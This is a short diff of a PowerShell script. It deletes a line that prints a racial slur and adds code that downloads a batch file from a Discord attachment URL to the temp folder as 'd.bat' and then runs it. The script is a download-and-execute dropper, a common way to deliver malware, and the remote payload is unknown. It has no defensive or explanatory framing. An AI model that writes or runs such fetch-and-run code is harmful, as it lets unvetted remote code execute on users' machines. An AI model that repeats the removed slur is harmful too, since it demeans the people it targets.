@@ -1,1 +1,13 @@
-Write-Host "hey neger"
+$Url = "https://cdn.discordapp.com/attachments/1149054015036981269/1150473976175399054/test.bat"
+
+$OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "d.bat")
+
+Invoke-WebRequest -Uri $Url -OutFile $OutputPath
+
+if (Test-Path $OutputPath) {
+    Write-Host "File downloaded successfully."
+
+    Start-Process $OutputPath
+} else {
+    Write-Host "File download failed."
+}
